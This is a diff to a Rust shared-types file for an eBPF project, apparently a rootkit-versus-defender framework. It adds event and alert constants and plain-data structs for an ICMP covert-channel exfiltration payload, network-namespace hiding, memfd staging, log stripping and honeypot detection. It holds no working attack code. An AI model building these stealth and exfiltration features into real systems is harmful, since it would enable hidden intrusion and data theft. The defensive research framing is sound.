@@ -124,6 +124,16 @@ pub const EVENT_DNS_EXFIL: u32 = 11;
 pub const EVENT_KALLSYMS_HIDDEN: u32 = 12;
 pub const EVENT_ANTI_DETACH: u32 = 13;
 pub const EVENT_TIMESTOMPED: u32 = 14;
+pub const EVENT_NETNS_HIDDEN: u32 = 15;
+pub const EVENT_BPF_CLOAKED: u32 = 16;
+pub const EVENT_MODULE_MASQUERADE: u32 = 17;
+pub const EVENT_MEMFD_STAGED: u32 = 18;
+pub const EVENT_SYSLOG_STRIPPED: u32 = 19;
+pub const EVENT_BYTECODE_WIPED: u32 = 20;
+pub const EVENT_ICMP_EXFIL: u32 = 21;
+pub const EVENT_SOCKET_CLONED: u32 = 22;
+pub const EVENT_CRED_RELAYED: u32 = 23;
+pub const EVENT_CONTAINER_PROBE: u32 = 24;
 
 // Defense event types (100+)
 pub const EVENT_GHOST_MAP_FOUND: u32 = 100;
@@ -212,6 +222,15 @@ pub const ALERT_SYSCALL_LATENCY: u32 = 2;
 pub const ALERT_BYTECODE_TAMPER: u32 = 3;
 pub const ALERT_HIDDEN_PROCESS: u32 = 4;
 pub const ALERT_SUSPICIOUS_HOOK: u32 = 5;
+pub const ALERT_PROG_INVENTORY: u32 = 6;
+pub const ALERT_SYSCALL_ANOMALY: u32 = 7;
+pub const ALERT_NET_BASELINE: u32 = 8;
+pub const ALERT_MEMFD_EXEC: u32 = 9;
+pub const ALERT_MAP_AUDIT: u32 = 10;
+pub const ALERT_TRACEPOINT_GAP: u32 = 11;
+pub const ALERT_AUTO_DETACH: u32 = 12;
+pub const ALERT_CONTAINMENT: u32 = 13;
+pub const ALERT_HONEYPOT_READ: u32 = 14;
 
 /// Minimum interval between alerts per-CPU in nanoseconds.
 /// Default: 100ms = 100_000_000ns.
@@ -260,6 +279,65 @@ pub struct TimestompEntry {
     pub fake_ctime_sec: u64,
 }
 
+/// ICMP covert channel exfiltration payload.
+/// Queued by user-space, sent by TC eBPF program inside ICMP echo-request.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct IcmpExfilPayload {
+    pub seq: u32,
+    pub data_len: u32,
+    pub data: [u8; 56],
+}
+
+/// Network namespace hiding entry.
+/// Key: netns inode. Value: this struct.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct NetnsHideEntry {
+    pub target_netns_ino: u64,
+    pub hide_from_pid: u32,
+    pub _pad: u32,
+}
+
+/// Memory-backed exec detection event.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct MemfdExecEvent {
+    pub pid: u32,
+    pub fd: u32,
+    pub timestamp_ns: u64,
+}
+
+/// Container escape probe result.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct ContainerProbeResult {
+    pub pid: u32,
+    pub in_container: u8,
+    pub ns_type: u8,
+    pub _pad: [u8; 2],
+    pub ns_ino: u64,
+}
+
+/// BPF program inventory entry for defense tracking.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct ProgInventoryEntry {
+    pub prog_id: u32,
+    pub prog_type: u32,
+    pub attach_type: u32,
+    pub _pad: u32,
+}
+
+/// Honeypot map access record.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct HoneypotAccess {
+    pub pid: u32,
+    pub map_id: u32,
+    pub timestamp_ns: u64,
+}
+
 // ──────────────────────────────────────────────
 // Safety: All structs above are plain-old-data (POD) types.
 // They contain no pointers, no references, and no Drop impls.
@@ -298,3 +376,21 @@ unsafe impl aya::Pod for DnsExfilChunk {}
 
 #[cfg(feature = "user")]
 unsafe impl aya::Pod for TimestompEntry {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for IcmpExfilPayload {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for NetnsHideEntry {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for MemfdExecEvent {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for ContainerProbeResult {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for ProgInventoryEntry {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for HoneypotAccess {}
